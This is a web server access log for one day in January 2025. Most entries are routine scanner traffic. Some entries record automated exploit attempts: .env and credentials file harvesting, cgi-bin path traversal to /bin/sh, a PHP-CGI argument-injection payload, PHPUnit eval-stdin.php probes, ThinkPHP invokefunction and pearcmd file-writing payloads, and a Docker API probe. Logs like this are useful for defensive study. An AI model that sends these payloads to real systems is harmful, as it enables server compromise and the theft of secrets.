64.62.197.101 - - [14/Jan/2025:00:14:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /BACKEND/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /Config/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.0; rv:50.0) Gecko/20100101 Firefox/50.0"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /CONFIG/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; tr-tr; GT-I8160 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /Core/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /CORE/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-G900P Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36"
78.153.140.177 - - [14/Jan/2025:14:41:43 +0000] "GET /Cp/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /CP/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; SiteKiosk 7.8 Build 332)"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /Credentials HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; SPH-D710BST Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30evme-launcher"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /CREDENTIALS HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; myTouch4G Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /Crm/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MAFSJS)"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /CRM/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /Data/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
78.153.140.177 - - [14/Jan/2025:14:41:44 +0000] "GET /DATA/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)"
153.169.116.5 - - [14/Jan/2025:14:43:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.55.190.215 - - [14/Jan/2025:14:46:44 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:45 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 488 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:46 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:48 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:49 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:50 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:50 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:51 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:52 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:53 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:54 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:55 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:56 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:57 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:58 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:46:59 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:00 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:01 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:02 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:03 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:04 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:05 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:06 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:07 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:08 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:09 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:10 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:11 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:12 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:13 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:14 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:15 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:16 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:17 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:18 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:19 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:20 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:21 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:22 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:23 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:24 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:25 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:26 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:27 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
92.55.190.215 - - [14/Jan/2025:14:47:28 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
172.169.3.142 - - [14/Jan/2025:15:26:42 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
193.34.212.75 - - [14/Jan/2025:15:32:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.147 - - [14/Jan/2025:15:46:12 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:15:46:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.148.10.242 - - [14/Jan/2025:15:56:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "Go-http-client/1.1"
95.214.55.226 - - [14/Jan/2025:15:56:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
139.59.101.104 - - [14/Jan/2025:16:01:49 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
175.201.188.71 - - [14/Jan/2025:16:08:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
47.245.117.221 - - [14/Jan/2025:16:10:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
185.242.226.10 - - [14/Jan/2025:16:32:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:16:33:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:16:33:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.168.34.221 - - [14/Jan/2025:16:37:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.221 - - [14/Jan/2025:16:37:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [14/Jan/2025:16:37:16 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [14/Jan/2025:16:37:16 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [14/Jan/2025:16:37:16 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
34.22.216.244 - - [14/Jan/2025:16:43:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
45.156.128.45 - - [14/Jan/2025:16:54:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.104.11.46 - - [14/Jan/2025:17:55:19 +0000] "\x16\x03\x01" 400 524 "-" "-"
193.34.212.75 - - [14/Jan/2025:18:10:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.147 - - [14/Jan/2025:18:32:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:18:32:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.23 - - [14/Jan/2025:18:33:22 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
18.222.231.155 - - [14/Jan/2025:18:41:53 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.222.231.155 - - [14/Jan/2025:18:41:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
198.235.24.27 - - [14/Jan/2025:19:03:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
206.168.34.195 - - [14/Jan/2025:19:25:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.195 - - [14/Jan/2025:19:25:13 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [14/Jan/2025:19:25:16 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [14/Jan/2025:19:25:19 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [14/Jan/2025:19:25:21 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
51.15.19.173 - - [14/Jan/2025:19:26:28 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
95.214.55.226 - - [14/Jan/2025:19:31:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [14/Jan/2025:19:39:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
14.45.122.224 - - [14/Jan/2025:19:40:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [14/Jan/2025:19:51:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [14/Jan/2025:20:04:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:20:04:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [14/Jan/2025:20:21:41 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
46.19.138.234 - - [14/Jan/2025:20:27:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.15 - - [14/Jan/2025:20:31:14 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.15 - - [14/Jan/2025:20:31:14 +0000] "\x16\x03\x01" 400 524 "-" "-"
220.123.199.89 - - [14/Jan/2025:20:42:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [14/Jan/2025:20:54:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
123.200.104.115 - - [14/Jan/2025:20:55:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
198.235.24.24 - - [14/Jan/2025:21:31:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.79.181.104 - - [14/Jan/2025:21:52:45 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.147 - - [14/Jan/2025:21:54:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:21:54:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.105 - - [14/Jan/2025:22:28:23 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.105 - - [14/Jan/2025:22:28:23 +0000] "\x16\x03\x01" 400 524 "-" "-"
210.50.98.51 - - [14/Jan/2025:22:30:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.163.163.45 - - [14/Jan/2025:22:56:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.163.163.45 - - [14/Jan/2025:22:56:53 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [14/Jan/2025:23:06:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [14/Jan/2025:23:06:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [14/Jan/2025:23:15:10 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
48.216.197.55 - - [14/Jan/2025:23:25:55 +0000] "MGLNDD_34.155.227.229_80\n" 400 524 "-" "-"
147.185.133.22 - - [14/Jan/2025:23:27:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
34.79.246.220 - - [14/Jan/2025:23:28:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
198.235.24.202 - - [14/Jan/2025:23:42:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
